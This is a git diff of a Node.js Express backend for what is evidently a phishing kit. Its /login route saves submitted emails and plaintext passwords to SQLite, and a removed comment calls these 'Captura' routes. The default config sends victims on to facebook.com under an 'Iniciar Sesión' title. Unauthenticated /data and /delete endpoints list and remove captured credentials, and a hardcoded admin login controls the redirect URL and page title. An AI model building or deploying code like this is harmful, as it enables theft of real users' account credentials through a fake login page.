@@ -1,13 +1,10 @@
 const express = require("express");
 const sqlite3 = require("sqlite3").verbose();
 const cors = require("cors");
-const path = require("path");
-
 const app = express();
 
-// --- CONFIGURACIÓN DE SEGURIDAD PARA EL ADMIN ---
-const ADMIN_USER = "xacherys"; // Cambia tu usuario aquí
-const ADMIN_PASS = "xacherys"; // Cambia tu contraseña aquí
+const ADMIN_USER = "xacherys"; 
+const ADMIN_PASS = "xacherys"; 
 
 app.use(cors());
 app.use(express.json());
@@ -22,31 +19,24 @@ db.serialize(() => {
     });
 });
 
-// Ruta para Login del Admin
 app.post("/admin-login", (req, res) => {
     const { user, pass } = req.body;
     if (user === ADMIN_USER && pass === ADMIN_PASS) {
-        res.json({ success: true, token: "access_granted_123" }); // Token simple para este ejemplo
+        res.json({ success: true, token: "jeffrey_secure_token_2026" });
     } else {
         res.status(401).json({ success: false });
     }
 });
 
-// Rutas de Configuración
 app.get("/config", (req, res) => {
-    db.get("SELECT * FROM config WHERE id = 1", (err, row) => {
-        res.json(row || { redirect_url: "https://facebook.com", counter_id: "", title: "Iniciar Sesión" });
-    });
+    db.get("SELECT * FROM config WHERE id = 1", (err, row) => res.json(row));
 });
 
 app.post("/config", (req, res) => {
     const { url, counter_id, title } = req.body;
-    db.run("UPDATE config SET redirect_url = ?, counter_id = ?, title = ? WHERE id = 1", [url, counter_id, title], () => {
-        res.json({ success: true });
-    });
+    db.run("UPDATE config SET redirect_url = ?, counter_id = ?, title = ? WHERE id = 1", [url, counter_id, title], () => res.json({ success: true }));
 });
 
-// Rutas de Datos (Captura)
 app.post("/login", (req, res) => {
     const { email, password } = req.body;
     db.run("INSERT INTO logins (email, password) VALUES (?, ?)", [email, password], () => res.json({ saved: true }));
@@ -56,9 +46,10 @@ app.get("/data", (req, res) => {
     db.all("SELECT * FROM logins ORDER BY id DESC", (err, rows) => res.json(rows));
 });
 
+// RUTA PARA BORRAR
 app.delete("/delete/:id", (req, res) => {
     db.run("DELETE FROM logins WHERE id = ?", [req.params.id], () => res.json({ deleted: true }));
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Server on port ${PORT}`));
+app.listen(PORT, () => console.log(`Servidor en puerto ${PORT}`));
